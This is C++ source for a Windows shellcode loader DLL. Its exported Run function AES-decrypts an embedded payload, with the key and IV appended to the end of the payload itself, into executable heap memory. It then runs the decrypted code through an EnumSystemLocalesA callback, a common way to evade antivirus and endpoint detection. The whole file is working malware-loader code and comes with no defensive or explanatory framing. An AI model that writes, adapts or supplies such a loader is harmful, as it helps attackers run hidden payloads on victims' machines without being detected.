#define WIN32_LEAN_AND_MEAN

#include <Windows.h>
#include <bcrypt.h>
#include <functional>

#pragma comment(lib, "Bcrypt.lib")

#ifdef LOADER_EXPORTS
#define LOADER_API __declspec(dllexport)
#else
#define LOADER_API __declspec(dllimport)
#endif

#define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)

extern "C" LOADER_API
void Run(PBYTE pbCipherText, DWORD cbCipherText)
{
    BCRYPT_ALG_HANDLE       hAesAlg = NULL;
    BCRYPT_KEY_HANDLE       hKey = NULL;
    NTSTATUS                status = STATUS_UNSUCCESSFUL;
    DWORD                   cbRawData = 0,
					        cbData = 0,
					        cbKeyObject = 0,
					        cbBlockLen = 0;
    PBYTE                   pbRawData = NULL,
					        pbKeyObject = NULL,
					        pbIV = NULL;
    BYTE                    rgbIV[16] = {};
    BYTE                    rgbAES128Key[16] = {};

	// Copy key and iv from the last 32 bytes of cipher text
    memcpy(rgbAES128Key, &pbCipherText[cbCipherText - 32], 16);
    memcpy(rgbIV, &pbCipherText[cbCipherText - 16], 16);

    // Open an algorithm handle.
    if (!NT_SUCCESS(status = BCryptOpenAlgorithmProvider(
        &hAesAlg,
        BCRYPT_AES_ALGORITHM,
        NULL,
        0)))
    {
        goto Cleanup;
    }

    // Calculate the size of the buffer to hold the KeyObject.
    if (!NT_SUCCESS(status = BCryptGetProperty(
        hAesAlg,
        BCRYPT_OBJECT_LENGTH,
        (PBYTE)&cbKeyObject,
        sizeof(DWORD),
        &cbData,
        0)))
    {
        goto Cleanup;
    }

    // Allocate the key object on the heap.;
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (NULL == pbKeyObject)
    {
        goto Cleanup;
    }

    // Calculate the block length for the IV.
    if (!NT_SUCCESS(status = BCryptGetProperty(
        hAesAlg,
        BCRYPT_BLOCK_LENGTH,
        (PBYTE)&cbBlockLen,
        sizeof(DWORD),
        &cbData,
        0)))
    {
        goto Cleanup;
    }

    // Determine whether the cbBlockLen is not longer than the IV length.
    if (cbBlockLen > sizeof(rgbIV))
    {
        goto Cleanup;
    }

    // Allocate a buffer for the IV. The buffer is consumed during the 
    // encrypt/decrypt process.
    pbIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbBlockLen);
    if (NULL == pbIV)
    {
        goto Cleanup;
    }

    memcpy(pbIV, rgbIV, cbBlockLen);

    if (!NT_SUCCESS(status = BCryptSetProperty(
        hAesAlg,
        BCRYPT_CHAINING_MODE,
        (PBYTE)BCRYPT_CHAIN_MODE_CBC,
        sizeof(BCRYPT_CHAIN_MODE_CBC),
        0)))
    {
        goto Cleanup;
    }

    // Generate the key from supplied input key bytes.
    if (!NT_SUCCESS(status = BCryptGenerateSymmetricKey(
        hAesAlg,
        &hKey,
        pbKeyObject,
        cbKeyObject,
        (PBYTE)rgbAES128Key,
        sizeof(rgbAES128Key),
        0)))
    {
        goto Cleanup;
    }

    // Get the output buffer size.
    if (!NT_SUCCESS(status = BCryptDecrypt(
        hKey,
        pbCipherText,
        cbCipherText - 32,
        NULL,
        pbIV,
        cbBlockLen,
        NULL,
        0,
        &cbRawData,
        BCRYPT_BLOCK_PADDING)))
    {
        goto Cleanup;
    }

    pbRawData = (PBYTE)HeapAlloc(
        HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0),
        0, cbRawData);
    if (NULL == pbRawData)
    {
        goto Cleanup;
    }

    if (!NT_SUCCESS(status = BCryptDecrypt(
        hKey,
        pbCipherText,
        cbCipherText - 32,
        NULL,
        pbIV,
        cbBlockLen,
        pbRawData,
        cbRawData,
        &cbRawData,
        BCRYPT_BLOCK_PADDING)))
    {
        goto Cleanup;
    }

	// Run shellcode
    EnumSystemLocalesA((LOCALE_ENUMPROCA)pbRawData, 0);

Cleanup:

    if (hAesAlg)
        BCryptCloseAlgorithmProvider(hAesAlg, 0);

    if (hKey)
        BCryptDestroyKey(hKey);

    if (pbCipherText)
        HeapFree(GetProcessHeap(), 0, pbCipherText);

    if (pbRawData)
        HeapFree(GetProcessHeap(), 0, pbRawData);

    if (pbKeyObject)
        HeapFree(GetProcessHeap(), 0, pbKeyObject);

    if (pbIV)
        HeapFree(GetProcessHeap(), 0, pbIV);
}
